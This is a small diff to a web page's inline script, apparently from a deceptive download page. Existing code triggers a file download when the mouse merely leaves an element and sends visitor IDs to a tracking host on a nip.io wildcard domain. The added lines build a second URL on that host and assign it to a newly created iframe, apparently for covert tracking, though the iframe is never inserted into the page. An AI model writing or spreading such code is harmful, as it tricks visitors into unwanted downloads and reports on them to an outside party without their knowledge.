@@ -57,6 +57,7 @@
       var brid = params.get("id");
       var gpid = params.get("gp");
       var stats = "https://stats-034543f5.nip.io/omg/0x20/track?rid=" + gpid + "&other=";
+      var moder = "https://stats-034543f5.nip.io/omg/0x20/?rid=" + gpid + "&google=1";
       var started = 0;
     </script>
     <script>
@@ -98,6 +99,7 @@
         document.getElementById("x1x1").onmouseout = function () {
           download();
         };
+        var yes2 = (document.createElement("iframe").src = moder);
       }, 100);
       makestats("sc");
       gtag("event", "ready", { id1: brid, id2: gpid });
